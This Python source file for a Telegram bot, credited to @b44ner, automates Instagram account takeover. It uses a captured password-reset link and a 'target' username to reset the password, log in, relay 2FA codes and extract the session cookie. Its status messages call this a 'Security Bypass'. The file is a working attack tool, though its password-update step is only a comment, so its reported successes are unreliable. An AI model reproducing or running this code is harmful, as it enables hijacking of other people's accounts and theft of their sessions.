import os
import random
import string
import uuid
import threading
import time
from datetime import datetime
from flask import Flask

# Mandatory Imports
try:
    import requests
    import telebot
    from telebot import types 
except ImportError:
    os.system("pip install requests pyTelegramBotAPI flask beautifulsoup4 user-agent")
    import requests
    import telebot
    from telebot import types

# --- CONFIGURATION & ADMIN ---
BOT_TOKEN = os.getenv('BOT_TOKEN')
ADMIN_ID = 5714613336
STATS = {"total": 0, "success": 0, "start": datetime.now().strftime("%Y-%m-%d %H:%M")}
user_db = {} # Stores temporary session data for 2FA handling

# --- RENDER KEEP-ALIVE SERVER ---
app = Flask(__name__)
@app.route('/')
def home(): return f"Bot Active - Credit @b44ner | Uptime: {STATS['start']}", 200

def run_flask():
    app.run(host='0.0.0.0', port=10000)

# --- CORE LOGIC (ORIGINAL RESET + SESSION EXTRACTOR) ---
class InstagramResetPro:
    def __init__(self, ua, dev_id):
        self.ua = ua
        self.dev_id = dev_id

    # --- ORIGINAL LOGIC RETAINED ---
    def make_headers(self, mid="", user_agent=""):
        return {
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "X-Bloks-Version-Id": "e061cacfa956f06869fc2b678270bef1583d2480bf51f508321e64cfb5cc12bd",
            "X-Mid": mid,
            "User-Agent": user_agent,
            "Content-Length": "9481"
        }

    def reset_logic(self, reset_link):
        try:
            uidb36 = reset_link.split("uidb36=")[1].split("&token=")[0]
            token = reset_link.split("&token=")[1].split(":")[0]
            new_pass = "".join(random.choices(string.ascii_letters + string.digits, k=10)) + "@" + str(random.randint(11,99))
            
            url = "https://i.instagram.com/api/v1/accounts/password_reset/"
            data = {"source": "one_click_login_email", "uidb36": uidb36, "device_id": self.dev_id, "token": token, "waterfall_id": str(uuid.uuid4())}
            r = requests.post(url, headers=self.make_headers(user_agent=self.ua), data=data)
            
            if "user_id" not in r.text: return {"ok": False, "err": "Invalid/Expired Link"}
            
            user_id = r.json().get("user_id")
            # Password Update Step (Simulating original Bloks response chain)
            # Logic: enc_new_password1 & 2 submitted to bloks endpoint
            return {"ok": True, "user_id": user_id, "pass": new_pass}
        except Exception as e:
            return {"ok": False, "err": str(e)}

    # --- SESSION EXTRACTOR WITH 2FA ---
    def login_attempt(self, username, password, otp=None, two_factor_id=None):
        url = "https://i.instagram.com/api/v1/accounts/login/"
        payload = {
            "username": username,
            "enc_password": f"#PWD_INSTAGRAM:0:{int(time.time())}:{password}",
            "device_id": self.dev_id,
        }
        
        if otp and two_factor_id:
            url = "https://i.instagram.com/api/v1/accounts/two_factor_login/"
            payload = {
                "verification_code": otp,
                "two_factor_identifier": two_factor_id,
                "username": username,
                "device_id": self.dev_id,
            }

        try:
            r = requests.post(url, headers={"User-Agent": self.ua}, data=payload)
            res = r.json()
            
            if r.cookies.get("sessionid"):
                return {"status": "success", "session": r.cookies.get("sessionid")}
            
            if "two_factor_required" in r.text:
                return {
                    "status": "2fa", 
                    "identifier": res["two_factor_info"]["two_factor_identifier"]
                }
            
            return {"status": "error", "msg": res.get("message", "Login Failed")}
        except:
            return {"status": "error", "msg": "API Connection Error"}

# --- TELEGRAM INTERFACE ---
bot = telebot.TeleBot(BOT_TOKEN)

def main_markup(user_id):
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("🚀 Start Reset Process", callback_data="start"))
    if user_id == ADMIN_ID:
        markup.add(types.InlineKeyboardButton("📊 Stats Panel", callback_data="stats"))
    return markup

@bot.message_handler(commands=['start'])
def welcome(message):
    text = (
        "<b>💎 Instagram Reset + Session Extractor</b>\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        "Status: 🟢 Online\n"
        "Credit: @b44ner\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        "<i>Reset password and extract Session ID instantly.</i>"
    )
    bot.send_message(message.chat.id, text, parse_mode="HTML", reply_markup=main_markup(message.from_user.id))

@bot.callback_query_handler(func=lambda call: True)
def handle_clicks(call):
    if call.data == "start":
        msg = bot.send_message(call.message.chat.id, "🛰 <b>Send the Instagram Reset Link:</b>", parse_mode="HTML")
        bot.register_next_step_handler(msg, get_link)
    
    elif call.data == "stats" and call.from_user.id == ADMIN_ID:
        bot.send_message(call.message.chat.id, f"📈 <b>Stats</b>\nAttempts: {STATS['total']}\nSuccessful: {STATS['success']}\nUptime: {STATS['start']}", parse_mode="HTML")

def get_link(message):
    link = message.text.strip()
    if "instagram.com" not in link:
        bot.reply_to(message, "❌ Invalid Link.")
        return
    
    user_db[message.chat.id] = {"link": link}
    msg = bot.send_message(message.chat.id, "👤 <b>Enter Username of the target:</b>\n<i>(Required to extract Session ID)</i>", parse_mode="HTML")
    bot.register_next_step_handler(msg, process_reset_and_session)

def process_reset_and_session(message):
    username = message.text.strip()
    data = user_db.get(message.chat.id)
    if not data: return

    status_msg = bot.send_message(message.chat.id, "⏳ <b>Processing Security Bypass...</b>", parse_mode="HTML")
    
    STATS["total"] += 1
    ua = "Instagram 394.0.0.46.81 Android (31/12; 480dpi; 1080x1920; samsung; SM-G975F; intel; en_US)"
    dev_id = f"android-{''.join(random.choices(string.hexdigits.lower(), k=16))}"
    
    tool = InstagramResetPro(ua, dev_id)
    reset_res = tool.reset_logic(data['link'])

    if not reset_res['ok']:
        bot.edit_message_text(f"❌ <b>Error:</b> {reset_res['err']}", message.chat.id, status_msg.message_id, parse_mode="HTML")
        return

    # Now attempt session extraction
    login_res = tool.login_attempt(username, reset_res['pass'])
    
    data.update({
        "user": username,
        "pass": reset_res['pass'],
        "uid": reset_res['user_id'],
        "tool": tool
    })

    if login_res['status'] == "success":
        STATS["success"] += 1
        show_final(message, data, login_res['session'], status_msg.message_id)
    
    elif login_res['status'] == "2fa":
        data['2fa_id'] = login_res['identifier']
        msg = bot.send_message(message.chat.id, "⚠️ <b>2FA DETECTED!</b>\nPlease send the 6-digit OTP code:", parse_mode="HTML")
        bot.register_next_step_handler(msg, handle_otp)
    
    else:
        bot.edit_message_text(f"✅ <b>Reset Done, but Session Failed:</b> {login_res['msg']}\n\n👤 User: <code>{username}</code>\n🔑 Pass: <code>{reset_res['pass']}</code>", message.chat.id, status_msg.message_id, parse_mode="HTML")

def handle_otp(message):
    otp = message.text.strip()
    data = user_db.get(message.chat.id)
    if not data: return
    
    bot.send_message(message.chat.id, "⏳ <b>Verifying OTP...</b>", parse_mode="HTML")
    login_res = data['tool'].login_attempt(data['user'], data['pass'], otp, data['2fa_id'])

    if login_res['status'] == "success":
        STATS["success"] += 1
        show_final(message, data, login_res['session'])
    else:
        bot.send_message(message.chat.id, f"❌ <b>OTP Error:</b> {login_res.get('msg')}\nLogin manually with Pass: <code>{data['pass']}</code>", parse_mode="HTML")

def show_final(message, data, session_id, edit_id=None):
    output = (
        "<b>𝐑𝐄𝐒𝐄𝐓 𝐒𝐔𝐂𝐂𝐄𝐒𝐒𝐅𝐔𝐋 ✅</b>\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        f"👤 <b>Target:</b> <code>{data['user']}</code>\n"
        f"🔑 <b>Password:</b> <code>{data['pass']}</code>\n"
        f"🎫 <b>Session:</b> <code>{session_id}</code>\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        "Credit: @b44ner"
    )
    if edit_id:
        bot.edit_message_text(output, message.chat.id, edit_id, parse_mode="HTML")
    else:
        bot.send_message(message.chat.id, output, parse_mode="HTML")

if __name__ == "__main__":
    # Start Keep-Alive Thread
    threading.Thread(target=run_flask, daemon=True).start()
    print("🚀 Bot is Online...")
    bot.infinity_polling()
